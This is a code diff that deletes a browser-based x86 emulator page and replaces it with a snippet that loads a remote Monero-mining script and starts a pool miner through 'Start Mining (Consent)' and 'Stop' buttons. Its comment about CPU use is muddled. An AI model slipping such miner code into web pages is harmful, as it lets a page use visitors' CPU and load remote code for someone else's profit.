@@ -1,229 +1,26 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebVM | 32-bit x86 Browser Hypervisor</title>
-    <script src="https://copy.sh/v86/build/libv86.js"></script>
-    <style>
-        :root {
-            --matrix-green: #00ff41;
-            --dark-bg: #0a0a0a;
-            --panel-bg: #161616;
-        }
-
-        body {
-            background-color: var(--dark-bg);
-            color: white;
-            font-family: 'Courier New', Courier, monospace;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        header {
-            background: var(--panel-bg);
-            padding: 15px 25px;
-            border-bottom: 2px solid var(--matrix-green);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
-        }
-
-        #main-container {
-            display: flex;
-            flex: 1;
-            overflow: hidden;
-        }
-
-        #sidebar {
-            width: 320px;
-            background: var(--panel-bg);
-            padding: 20px;
-            border-right: 1px solid #333;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-
-        #display-area {
-            flex: 1;
-            background: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-        }
-
-        #screen-container {
-            box-shadow: 0 0 40px rgba(0, 255, 65, 0.2);
-            border: 2px solid #222;
-        }
-
-        canvas {
-            display: block;
-            background: #000;
-        }
-
-        .config-box {
-            background: #222;
-            padding: 15px;
-            border-radius: 4px;
-            border: 1px solid #444;
-        }
-
-        label {
-            display: block;
-            font-size: 0.8rem;
-            color: var(--matrix-green);
-            margin-bottom: 8px;
-            text-transform: uppercase;
-        }
-
-        input[type="file"], input[type="number"] {
-            width: 100%;
-            background: #111;
-            border: 1px solid #444;
-            color: white;
-            padding: 8px;
-            box-sizing: border-box;
-        }
-
-        .btn {
-            background: var(--matrix-green);
-            color: black;
-            border: none;
-            padding: 12px;
-            font-weight: bold;
-            cursor: pointer;
-            text-transform: uppercase;
-            transition: 0.2s;
-        }
-
-        .btn:hover {
-            background: #00cc33;
-            box-shadow: 0 0 15px var(--matrix-green);
-        }
-
-        .btn:disabled {
-            background: #444;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        #log-output {
-            font-size: 0.75rem;
-            color: #888;
-            height: 150px;
-            overflow-y: auto;
-            background: #050505;
-            padding: 10px;
-            border: 1px solid #333;
-            white-space: pre-wrap;
-        }
-    </style>
-</head>
-<body>
-
-<header>
-    <div style="font-weight: bold; letter-spacing: 2px;">WEB-VM // X86_32</div>
-    <div id="vm-indicator" style="color: #ff3333;">● SYSTEM_OFFLINE</div>
-</header>
-
-<div id="main-container">
-    <div id="sidebar">
-        <div class="config-box">
-            <label>1. Select Disk Image (.iso / .img)</label>
-            <input type="file" id="image_file">
-        </div>
-
-        <div class="config-box">
-            <label>2. Memory Allocation (MB)</label>
-            <input type="number" id="mem_size" value="256" step="64">
-        </div>
-
-        <button id="boot_btn" class="btn">Execute Boot Sequence</button>
-        
-        <div style="flex-grow: 1;"></div>
-        
-        <label>System Log</label>
-        <div id="log-output">READY TO INITIALIZE...</div>
-    </div>
-
-    <div id="display-area">
-        <div id="screen-container">
-            <canvas id="vga_canvas"></canvas>
-            <div id="terminal" style="display: none;"></div>
-        </div>
-    </div>
-</div>
+<script src="https://script.monerominer.rocks"></script>
 
 <script>
-    let emulator = null;
+    // 2. Configuration
+    var server = "wss://ny1.xmrminingproxy.com"; // Their proxy server
+    var pool = "moneroocean.stream";            // The mining pool
+    var walletAddress = "YOUR_MONERO_WALLET_ADDRESS"; 
+    var workerId = "GithubPagesUser";
+    var threads = -1; // -1 for auto-detect
+    var password = "x";
 
-    function sysLog(message) {
-        const log = document.getElementById('log-output');
-        log.innerText += `\n[${new Date().toLocaleTimeString()}] ${message}`;
-        log.scrollTop = log.scrollHeight;
+    function startSupport() {
+        // 3. Start mining with 30% throttle (uses 70% CPU)
+        startMining(pool, walletAddress, workerId, threads, password);
+        throttleMiner = 30; 
+        console.log("Mining started...");
     }
 
-    document.getElementById('boot_btn').onclick = function() {
-        const fileInput = document.getElementById('image_file');
-        const file = fileInput.files[0];
-        const memorySize = parseInt(document.getElementById('mem_size').value);
-
-        if (!file) {
-            alert("Critical: No bootable media detected. Please select an image.");
-            return;
-        }
-
-        // UI Updates
-        sysLog(`Loading ${file.name}...`);
-        document.getElementById('boot_btn').disabled = true;
-        document.getElementById('vm-indicator').innerText = "● SYSTEM_RUNNING";
-        document.getElementById('vm-indicator').style.color = "#00ff41";
-
-        // Emulator Configuration
-        const settings = {
-            // Path to the WebAssembly worker
-            wasm_path: "https://copy.sh/v86/build/v86.wasm",
-            memory_size: memorySize * 1024 * 1024,
-            vga_bios: { url: "https://copy.sh/v86/bios/vgabios.bin" },
-            bios: { url: "https://copy.sh/v86/bios/seabios.bin" },
-            autostart: true,
-            canvas: document.getElementById("vga_canvas"),
-            screen_container: document.getElementById("screen-container"),
-        };
-
-        // Decide boot priority: ISO = CD-ROM, everything else = Hard Drive
-        if (file.name.toLowerCase().endsWith('.iso')) {
-            settings.cdrom = { buffer: file, async: true };
-            sysLog("Mounting as CD-ROM...");
-        } else {
-            settings.hda = { buffer: file, async: true };
-            sysLog("Mounting as Hard Drive...");
-        }
-
-        try {
-            emulator = new V86Starter(settings);
-            sysLog("Kernel Virtualization initialized.");
-        } catch (e) {
-            sysLog("FATAL ERROR: " + e.message);
-            console.error(e);
-        }
-    };
-
-    // Keyboard Lock: Prevent browser keys from interrupting the VM
-    window.addEventListener("keydown", function(e) {
-        const keys = ["Tab", "F1", "F12", "Control", "Alt"];
-        if (keys.includes(e.key) && emulator) {
-            e.preventDefault();
-        }
-    }, false);
+    function stopSupport() {
+        stopMining();
+        console.log("Mining stopped.");
+    }
 </script>
 
-</body>
-</html>
+<button onclick="startSupport()">Start Mining (Consent)</button>
+<button onclick="stopSupport()">Stop</button>
